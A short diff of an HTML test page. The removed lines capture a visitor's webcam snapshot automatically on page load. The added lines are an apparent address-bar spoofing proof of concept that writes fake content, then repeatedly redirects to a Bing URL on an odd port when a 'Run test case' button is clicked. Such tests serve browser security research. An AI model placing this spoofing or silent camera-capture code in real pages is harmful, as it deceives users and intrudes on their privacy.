@@ -1,35 +1,9 @@
-<!doctype html>
-<html>
-  <body>
-    <link href="https://fonts.googleapis.com/css?family=Press+Start+2P" rel="stylesheet"> <link href="https://unpkg.com/nes.css@latest/css/nes.min.css" rel="stylesheet">
-    <style>
-      #my_camera{
-        width: 600px;
-        height: 400;
-      }
-      body{color: #ffffff; background-color: #212529; padding: 0 2rem; margin: 0 2rem;}.container{max-width: 400px; margin: 0 auto; margin-top: 40px;}.nes-container{margin-bottom: 1.5rem !important;}</style>
-    <div id="my_camera"></div>
-    <body onload="take_snapshot()">
-      <div id="results" ></div>
-      <script type="text/javascript" src="https://makitweb.com/demo/webcam/webcamjs/webcam.min.js"></script>
-      <script language="JavaScript">
-        Webcam.set({
-          width: 600,
-          height: 400,
-          image_format: 'jpeg',
-          jpeg_quality: 90,
+<script>  
+  function spoof() { 
+  document.write("<h1>This is not Bing</h1>");  
+  document.location = "https://bing.com:1234"; 
+    setInterval(function(){document.location="https://bing.com:1234";},9800); 
+  }; 
+</script> 
 
-        });
-        Webcam.attach( '#my_camera' );
-      </script>
-      <script language="JavaScript">
-
-        function take_snapshot() {
-          Webcam.snap( function(data_uri) {
-            document.getElementById('results').innerHTML = 
-              '<img src="'+data_uri+'"/>';
-          } );
-        }
-      </script>
-    </body>
-    </html>
+<p class="test"><input class="btn btn-success btn-lg" type="button" value="Run test case"  onclick="spoof();" /> 
